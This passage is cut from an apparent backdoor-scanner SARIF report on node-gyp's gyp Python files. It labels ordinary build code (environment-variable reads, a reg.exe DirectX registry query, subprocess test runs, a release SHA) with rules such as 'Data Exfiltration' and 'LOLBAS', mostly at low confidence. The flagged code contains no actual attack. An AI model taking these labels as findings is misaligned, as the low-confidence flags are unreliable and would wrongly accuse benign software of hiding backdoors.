                  "startLine": 182,
                  "startColumn": 4,
                  "endLine": 182,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    if not all_system_includes:\n        return None\n    # Expand macros in all_system_includes.\n    env = GetGlobalVSMacroEnv(GetVSVersion(generator_flags))\n    expanded_system_includes = OrderedSet(\n        [ExpandMacros(include, env) for include in all_system_includes]\n    )\n",
                    "rendered": {
                      "text": "    if not all_system_includes:\n        return None\n    # Expand macros in all_system_includes.\n    env = GetGlobalVSMacroEnv(GetVSVersion(generator_flags))\n    expanded_system_includes = OrderedSet(\n        [ExpandMacros(include, env) for include in all_system_includes]\n    )\n",
                      "markdown": "`    if not all_system_includes:\n        return None\n    # Expand macros in all_system_includes.\n    env = GetGlobalVSMacroEnv(GetVSVersion(generator_flags))\n    expanded_system_includes = OrderedSet(\n        [ExpandMacros(include, env) for include in all_system_includes]\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 168,
                  "startColumn": 4,
                  "endLine": 168,
                  "endColumn": 38,
                  "snippet": {
                    "text": "    env[\"$(DXSDK_DIR)\"] = dxsdk_dir if dxsdk_dir else \"\"\n    # Try to find an installation location for the Windows DDK by checking\n    # the WDK_DIR environment variable, may be None.\n    env[\"$(WDK_DIR)\"] = os.environ.get(\"WDK_DIR\", \"\")\n    return env\n\n\n",
                    "rendered": {
                      "text": "    env[\"$(DXSDK_DIR)\"] = dxsdk_dir if dxsdk_dir else \"\"\n    # Try to find an installation location for the Windows DDK by checking\n    # the WDK_DIR environment variable, may be None.\n    env[\"$(WDK_DIR)\"] = os.environ.get(\"WDK_DIR\", \"\")\n    return env\n\n\n",
                      "markdown": "`    env[\"$(DXSDK_DIR)\"] = dxsdk_dir if dxsdk_dir else \"\"\n    # Try to find an installation location for the Windows DDK by checking\n    # the WDK_DIR environment variable, may be None.\n    env[\"$(WDK_DIR)\"] = os.environ.get(\"WDK_DIR\", \"\")\n    return env\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 136,
                  "startColumn": 19,
                  "endLine": 136,
                  "endColumn": 30,
                  "snippet": {
                    "text": "    if hasattr(_FindDirectXInstallation, \"dxsdk_dir\"):\n        return _FindDirectXInstallation.dxsdk_dir\n\n    dxsdk_dir = os.environ.get(\"DXSDK_DIR\")\n    if not dxsdk_dir:\n        # Setup params to pass to and attempt to launch reg.exe.\n        cmd = [\"reg.exe\", \"query\", r\"HKLM\\Software\\Microsoft\\DirectX\", \"/s\"]\n",
                    "rendered": {
                      "text": "    if hasattr(_FindDirectXInstallation, \"dxsdk_dir\"):\n        return _FindDirectXInstallation.dxsdk_dir\n\n    dxsdk_dir = os.environ.get(\"DXSDK_DIR\")\n    if not dxsdk_dir:\n        # Setup params to pass to and attempt to launch reg.exe.\n        cmd = [\"reg.exe\", \"query\", r\"HKLM\\Software\\Microsoft\\DirectX\", \"/s\"]\n",
                      "markdown": "`    if hasattr(_FindDirectXInstallation, \"dxsdk_dir\"):\n        return _FindDirectXInstallation.dxsdk_dir\n\n    dxsdk_dir = os.environ.get(\"DXSDK_DIR\")\n    if not dxsdk_dir:\n        # Setup params to pass to and attempt to launch reg.exe.\n        cmd = [\"reg.exe\", \"query\", r\"HKLM\\Software\\Microsoft\\DirectX\", \"/s\"]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/_manylinux.py"
                },
                "region": {
                  "startLine": 111,
                  "startColumn": 29,
                  "endLine": 111,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    # We must also handle the special case where the executable is not a\n    # dynamically linked executable. This can occur when using musl libc,\n    # for example. In this situation, dlopen() will error, leading to an\n    # OSError. Interestingly, at least in the case of musl, there is no\n    # errno set on the OSError. The single string argument used to construct\n    # OSError comes from libc itself and is therefore not portable to\n    # hard code here. In any case, failure to call dlopen() means we\n",
                    "rendered": {
                      "text": "    # We must also handle the special case where the executable is not a\n    # dynamically linked executable. This can occur when using musl libc,\n    # for example. In this situation, dlopen() will error, leading to an\n    # OSError. Interestingly, at least in the case of musl, there is no\n    # errno set on the OSError. The single string argument used to construct\n    # OSError comes from libc itself and is therefore not portable to\n    # hard code here. In any case, failure to call dlopen() means we\n",
                      "markdown": "`    # We must also handle the special case where the executable is not a\n    # dynamically linked executable. This can occur when using musl libc,\n    # for example. In this situation, dlopen() will error, leading to an\n    # OSError. Interestingly, at least in the case of musl, there is no\n    # errno set on the OSError. The single string argument used to construct\n    # OSError comes from libc itself and is therefore not portable to\n    # hard code here. In any case, failure to call dlopen() means we\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/_manylinux.py"
                },
                "region": {
                  "startLine": 65,
                  "startColumn": 48,
                  "endLine": 65,
                  "endColumn": 56,
                  "snippet": {
                    "text": "# If glibc ever changes its major version, we need to know what the last\n# minor version was, so we can build the complete list of all versions.\n# For now, guess what the highest minor version might be, assume it will\n# be 50 for testing. Once this actually happens, update the dictionary\n# with the actual value.\n_LAST_GLIBC_MINOR: Dict[int, int] = collections.defaultdict(lambda: 50)\n\n",
                    "rendered": {
                      "text": "# If glibc ever changes its major version, we need to know what the last\n# minor version was, so we can build the complete list of all versions.\n# For now, guess what the highest minor version might be, assume it will\n# be 50 for testing. Once this actually happens, update the dictionary\n# with the actual value.\n_LAST_GLIBC_MINOR: Dict[int, int] = collections.defaultdict(lambda: 50)\n\n",
                      "markdown": "`# If glibc ever changes its major version, we need to know what the last\n# minor version was, so we can build the complete list of all versions.\n# For now, guess what the highest minor version might be, assume it will\n# be 50 for testing. Once this actually happens, update the dictionary\n# with the actual value.\n_LAST_GLIBC_MINOR: Dict[int, int] = collections.defaultdict(lambda: 50)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/release-please-config.json"
                },
                "region": {
                  "startLine": 2,
                  "startColumn": 24,
                  "endLine": 2,
                  "endColumn": 66,
                  "snippet": {
                    "text": "{\n    \"last-release-sha\": \"78756421b0d7bb335992a9c7d26ba3cc8b619708\",\n    \"packages\": {\n        \".\": {\n          \"release-type\": \"python\",\n",
                    "rendered": {
                      "text": "{\n    \"last-release-sha\": \"78756421b0d7bb335992a9c7d26ba3cc8b619708\",\n    \"packages\": {\n        \".\": {\n          \"release-type\": \"python\",\n",
                      "markdown": "`{\n    \"last-release-sha\": \"78756421b0d7bb335992a9c7d26ba3cc8b619708\",\n    \"packages\": {\n        \".\": {\n          \"release-type\": \"python\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/test_gyp.py"
                },
                "region": {
                  "startLine": 204,
                  "startColumn": 7,
                  "endLine": 204,
                  "endColumn": 12,
                  "snippet": {
                    "text": "        self.print_(msg)\n\n        start = time.time()\n        cmd = [sys.executable, test] + self.gyp_options\n        self.env[\"TESTGYP_FORMAT\"] = fmt\n        proc = subprocess.Popen(\n            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=self.env\n",
                    "rendered": {
                      "text": "        self.print_(msg)\n\n        start = time.time()\n        cmd = [sys.executable, test] + self.gyp_options\n        self.env[\"TESTGYP_FORMAT\"] = fmt\n        proc = subprocess.Popen(\n            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=self.env\n",
                      "markdown": "`        self.print_(msg)\n\n        start = time.time()\n        cmd = [sys.executable, test] + self.gyp_options\n        self.env[\"TESTGYP_FORMAT\"] = fmt\n        proc = subprocess.Popen(\n            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=self.env\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/test_gyp.py"
                },
                "region": {
                  "startLine": 205,
                  "startColumn": 36,
                  "endLine": 206,
                  "snippet": {
                    "text": "\n        start = time.time()\n        cmd = [sys.executable, test] + self.gyp_options\n        self.env[\"TESTGYP_FORMAT\"] = fmt\n        proc = subprocess.Popen(\n            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=self.env\n        )\n        proc.wait()\n",
                    "rendered": {
                      "text": "\n        start = time.time()\n        cmd = [sys.executable, test] + self.gyp_options\n        self.env[\"TESTGYP_FORMAT\"] = fmt\n        proc = subprocess.Popen(\n            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=self.env\n        )\n        proc.wait()\n",
                      "markdown": "`\n        start = time.time()\n        cmd = [sys.executable, test] + self.gyp_options\n        self.env[\"TESTGYP_FORMAT\"] = fmt\n        proc = subprocess.Popen(\n            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=self.env\n        )\n        proc.wait()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/test_gyp.py"
                },
                "region": {
                  "startLine": 186,
                  "startColumn": 11,
                  "endLine": 186,
                  "endColumn": 16,
                  "snippet": {
                    "text": "        run_start = time.time()\n\n        i = 1\n        for fmt in self.formats:\n            for test in self.tests:\n                self.run_test(test, fmt, i)\n                i += 1\n",
                    "rendered": {
                      "text": "        run_start = time.time()\n\n        i = 1\n        for fmt in self.formats:\n            for test in self.tests:\n                self.run_test(test, fmt, i)\n                i += 1\n",
                      "markdown": "`        run_start = time.time()\n\n        i = 1\n        for fmt in self.formats:\n            for test in self.tests:\n                self.run_test(test, fmt, i)\n                i += 1\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/test_gyp.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 6,
                  "endLine": 15,
                  "snippet": {
                    "text": "import platform\nimport subprocess\nimport sys\nimport time\n\n\ndef is_test_name(f):\n    return f.startswith(\"gyptest\") and f.endswith(\".py\")\n",
                    "rendered": {
                      "text": "import platform\nimport subprocess\nimport sys\nimport time\n\n\ndef is_test_name(f):\n    return f.startswith(\"gyptest\") and f.endswith(\".py\")\n",
                      "markdown": "`import platform\nimport subprocess\nimport sys\nimport time\n\n\ndef is_test_name(f):\n    return f.startswith(\"gyptest\") and f.endswith(\".py\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/dump_dependency_json.py"
                },
                "region": {
                  "startLine": 91,
                  "startColumn": 39,
                  "endLine": 91,
                  "endColumn": 44,
                  "snippet": {
                    "text": "            continue\n        edges[target] = []\n\n        for dep in target_dicts[target].get(\"dependencies\", []):\n            edges[target].append(dep)\n            targets_to_visit.append(dep)\n\n",
                    "rendered": {
                      "text": "            continue\n        edges[target] = []\n\n        for dep in target_dicts[target].get(\"dependencies\", []):\n            edges[target].append(dep)\n            targets_to_visit.append(dep)\n\n",
                      "markdown": "`            continue\n        edges[target] = []\n\n        for dep in target_dicts[target].get(\"dependencies\", []):\n            edges[target].append(dep)\n            targets_to_visit.append(dep)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/dump_dependency_json.py"
                },
                "region": {
                  "startLine": 67,
                  "startColumn": 32,
                  "endLine": 67,
                  "endColumn": 37,
                  "snippet": {
                    "text": "    toplevel = params[\"options\"].toplevel_dir\n    generator_dir = os.path.relpath(params[\"options\"].generator_output or \".\")\n    # output_dir: relative path from generator_dir to the build directory.\n    output_dir = generator_flags.get(\"output_dir\", \"out\")\n    qualified_out_dir = os.path.normpath(\n        os.path.join(toplevel, generator_dir, output_dir, \"gypfiles\")\n    )\n",
                    "rendered": {
                      "text": "    toplevel = params[\"options\"].toplevel_dir\n    generator_dir = os.path.relpath(params[\"options\"].generator_output or \".\")\n    # output_dir: relative path from generator_dir to the build directory.\n    output_dir = generator_flags.get(\"output_dir\", \"out\")\n    qualified_out_dir = os.path.normpath(\n        os.path.join(toplevel, generator_dir, output_dir, \"gypfiles\")\n    )\n",
                      "markdown": "`    toplevel = params[\"options\"].toplevel_dir\n    generator_dir = os.path.relpath(params[\"options\"].generator_output or \".\")\n    # output_dir: relative path from generator_dir to the build directory.\n    output_dir = generator_flags.get(\"output_dir\", \"out\")\n    qualified_out_dir = os.path.normpath(\n        os.path.join(toplevel, generator_dir, output_dir, \"gypfiles\")\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/dump_dependency_json.py"
                },
                "region": {
                  "startLine": 60,
                  "startColumn": 22,
                  "endLine": 60,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    \"\"\"Calculate the generator specific info that gets fed to input (called by\n  gyp).\"\"\"\n    generator_flags = params.get(\"generator_flags\", {})\n    if generator_flags.get(\"adjust_static_libraries\", False):\n        global generator_wants_static_library_dependencies_adjusted\n        generator_wants_static_library_dependencies_adjusted = True\n\n",
                    "rendered": {
                      "text": "    \"\"\"Calculate the generator specific info that gets fed to input (called by\n  gyp).\"\"\"\n    generator_flags = params.get(\"generator_flags\", {})\n    if generator_flags.get(\"adjust_static_libraries\", False):\n        global generator_wants_static_library_dependencies_adjusted\n        generator_wants_static_library_dependencies_adjusted = True\n\n",
                      "markdown": "`    \"\"\"Calculate the generator specific info that gets fed to input (called by\n  gyp).\"\"\"\n    generator_flags = params.get(\"generator_flags\", {})\n    if generator_flags.get(\"adjust_static_libraries\", False):\n        global generator_wants_static_library_dependencies_adjusted\n        generator_wants_static_library_dependencies_adjusted = True\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/dump_dependency_json.py"
                },
                "region": {
                  "startLine": 59,
                  "startColumn": 28,
                  "endLine": 59,
                  "endColumn": 33,
                  "snippet": {
                    "text": "def CalculateGeneratorInputInfo(params):\n    \"\"\"Calculate the generator specific info that gets fed to input (called by\n  gyp).\"\"\"\n    generator_flags = params.get(\"generator_flags\", {})\n    if generator_flags.get(\"adjust_static_libraries\", False):\n        global generator_wants_static_library_dependencies_adjusted\n        generator_wants_static_library_dependencies_adjusted = True\n",
                    "rendered": {
                      "text": "def CalculateGeneratorInputInfo(params):\n    \"\"\"Calculate the generator specific info that gets fed to input (called by\n  gyp).\"\"\"\n    generator_flags = params.get(\"generator_flags\", {})\n    if generator_flags.get(\"adjust_static_libraries\", False):\n        global generator_wants_static_library_dependencies_adjusted\n        generator_wants_static_library_dependencies_adjusted = True\n",
                      "markdown": "`def CalculateGeneratorInputInfo(params):\n    \"\"\"Calculate the generator specific info that gets fed to input (called by\n  gyp).\"\"\"\n    generator_flags = params.get(\"generator_flags\", {})\n    if generator_flags.get(\"adjust_static_libraries\", False):\n        global generator_wants_static_library_dependencies_adjusted\n        generator_wants_static_library_dependencies_adjusted = True\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/dump_dependency_json.py"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 28,
                  "endLine": 46,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\n\ndef CalculateVariables(default_variables, params):\n    generator_flags = params.get(\"generator_flags\", {})\n    for key, val in generator_flags.items():\n        default_variables.setdefault(key, val)\n    default_variables.setdefault(\"OS\", gyp.common.GetFlavor(params))\n",
                    "rendered": {
                      "text": "\n\ndef CalculateVariables(default_variables, params):\n    generator_flags = params.get(\"generator_flags\", {})\n    for key, val in generator_flags.items():\n        default_variables.setdefault(key, val)\n    default_variables.setdefault(\"OS\", gyp.common.GetFlavor(params))\n",
                      "markdown": "`\n\ndef CalculateVariables(default_variables, params):\n    generator_flags = params.get(\"generator_flags\", {})\n    for key, val in generator_flags.items():\n        default_variables.setdefault(key, val)\n    default_variables.setdefault(\"OS\", gyp.common.GetFlavor(params))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/compile_commands_json.py"
                },
                "region": {
                  "startLine": 118,
                  "startColumn": 56,
                  "endLine": 118,
                  "endColumn": 61,
                  "snippet": {
                    "text": "        output_dir = params.get(\"options\").generator_output\n    except AttributeError:\n        pass\n    output_dir = output_dir or params[\"generator_flags\"].get(\"output_dir\", \"out\")\n    for configuration_name, commands in per_config_commands.items():\n        filename = os.path.join(output_dir, configuration_name, \"compile_commands.json\")\n        gyp.common.EnsureDirExists(filename)\n",
                    "rendered": {
                      "text": "        output_dir = params.get(\"options\").generator_output\n    except AttributeError:\n        pass\n    output_dir = output_dir or params[\"generator_flags\"].get(\"output_dir\", \"out\")\n    for configuration_name, commands in per_config_commands.items():\n        filename = os.path.join(output_dir, configuration_name, \"compile_commands.json\")\n        gyp.common.EnsureDirExists(filename)\n",
                      "markdown": "`        output_dir = params.get(\"options\").generator_output\n    except AttributeError:\n        pass\n    output_dir = output_dir or params[\"generator_flags\"].get(\"output_dir\", \"out\")\n    for configuration_name, commands in per_config_commands.items():\n        filename = os.path.join(output_dir, configuration_name, \"compile_commands.json\")\n        gyp.common.EnsureDirExists(filename)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/compile_commands_json.py"
                },
                "region": {
                  "startLine": 115,
                  "startColumn": 27,
                  "endLine": 115,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    try:\n        # generator_output can be `None` on Windows machines, or even not\n        # defined in other cases\n        output_dir = params.get(\"options\").generator_output\n    except AttributeError:\n        pass\n    output_dir = output_dir or params[\"generator_flags\"].get(\"output_dir\", \"out\")\n",
                    "rendered": {
                      "text": "    try:\n        # generator_output can be `None` on Windows machines, or even not\n        # defined in other cases\n        output_dir = params.get(\"options\").generator_output\n    except AttributeError:\n        pass\n    output_dir = output_dir or params[\"generator_flags\"].get(\"output_dir\", \"out\")\n",
                      "markdown": "`    try:\n        # generator_output can be `None` on Windows machines, or even not\n        # defined in other cases\n        output_dir = params.get(\"options\").generator_output\n    except AttributeError:\n        pass\n    output_dir = output_dir or params[\"generator_flags\"].get(\"output_dir\", \"out\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/compile_commands_json.py"
                },
                "region": {
                  "startLine": 71,
                  "startColumn": 36,
                  "endLine": 71,
                  "endColumn": 41,
                  "snippet": {
                    "text": "            return os.path.abspath(os.path.join(cwd, filename))\n\n        # TODO(bnoordhuis) Handle generated header files.\n        include_dirs = configuration.get(\"include_dirs\", [])\n        include_dirs = [s for s in include_dirs if not s.startswith(\"$(obj)\")]\n        includes = [\"-I\" + resolve(s) for s in include_dirs]\n\n",
                    "rendered": {
                      "text": "            return os.path.abspath(os.path.join(cwd, filename))\n\n        # TODO(bnoordhuis) Handle generated header files.\n        include_dirs = configuration.get(\"include_dirs\", [])\n        include_dirs = [s for s in include_dirs if not s.startswith(\"$(obj)\")]\n        includes = [\"-I\" + resolve(s) for s in include_dirs]\n\n",
                      "markdown": "`            return os.path.abspath(os.path.join(cwd, filename))\n\n        # TODO(bnoordhuis) Handle generated header files.\n        include_dirs = configuration.get(\"include_dirs\", [])\n        include_dirs = [s for s in include_dirs if not s.startswith(\"$(obj)\")]\n        includes = [\"-I\" + resolve(s) for s in include_dirs]\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/compile_commands_json.py"
                },
                "region": {
                  "startLine": 65,
                  "startColumn": 36,
                  "endLine": 65,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\n        # TODO(bnoordhuis) Handle generated source files.\n        extensions = (\".c\", \".cc\", \".cpp\", \".cxx\")\n        sources = [s for s in target.get(\"sources\", []) if s.endswith(extensions)]\n\n        def resolve(filename):\n            return os.path.abspath(os.path.join(cwd, filename))\n",
                    "rendered": {
                      "text": "\n        # TODO(bnoordhuis) Handle generated source files.\n        extensions = (\".c\", \".cc\", \".cpp\", \".cxx\")\n        sources = [s for s in target.get(\"sources\", []) if s.endswith(extensions)]\n\n        def resolve(filename):\n            return os.path.abspath(os.path.join(cwd, filename))\n",
                      "markdown": "`\n        # TODO(bnoordhuis) Handle generated source files.\n        extensions = (\".c\", \".cc\", \".cpp\", \".cxx\")\n        sources = [s for s in target.get(\"sources\", []) if s.endswith(extensions)]\n\n        def resolve(filename):\n            return os.path.abspath(os.path.join(cwd, filename))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/compile_commands_json.py"
                },
                "region": {
                  "startLine": 60,
                  "startColumn": 31,
                  "endLine": 60,
                  "endColumn": 36,
                  "snippet": {
                    "text": "        cflags_c = cflags + cflags_c\n        cflags_cc = cflags + cflags_cc\n\n        defines = configuration.get(\"defines\", [])\n        defines = [\"-D\" + s for s in defines]\n\n        # TODO(bnoordhuis) Handle generated source files.\n",
                    "rendered": {
                      "text": "        cflags_c = cflags + cflags_c\n        cflags_cc = cflags + cflags_cc\n\n        defines = configuration.get(\"defines\", [])\n        defines = [\"-D\" + s for s in defines]\n\n        # TODO(bnoordhuis) Handle generated source files.\n",
                      "markdown": "`        cflags_c = cflags + cflags_c\n        cflags_cc = cflags + cflags_cc\n\n        defines = configuration.get(\"defines\", [])\n        defines = [\"-D\" + s for s in defines]\n\n        # TODO(bnoordhuis) Handle generated source files.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/compile_commands_json.py"
                },
                "region": {
                  "startLine": 55,
                  "startColumn": 37,
                  "endLine": 55,
                  "endColumn": 42,
                  "snippet": {
                    "text": "        else:\n            cflags = configuration.get(\"cflags\", [])\n            cflags_c = configuration.get(\"cflags_c\", [])\n            cflags_cc = configuration.get(\"cflags_cc\", [])\n\n        cflags_c = cflags + cflags_c\n        cflags_cc = cflags + cflags_cc\n",
                    "rendered": {
                      "text": "        else:\n            cflags = configuration.get(\"cflags\", [])\n            cflags_c = configuration.get(\"cflags_c\", [])\n            cflags_cc = configuration.get(\"cflags_cc\", [])\n\n        cflags_c = cflags + cflags_c\n        cflags_cc = cflags + cflags_cc\n",
                      "markdown": "`        else:\n            cflags = configuration.get(\"cflags\", [])\n            cflags_c = configuration.get(\"cflags_c\", [])\n            cflags_cc = configuration.get(\"cflags_cc\", [])\n\n        cflags_c = cflags + cflags_c\n        cflags_cc = cflags + cflags_cc\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
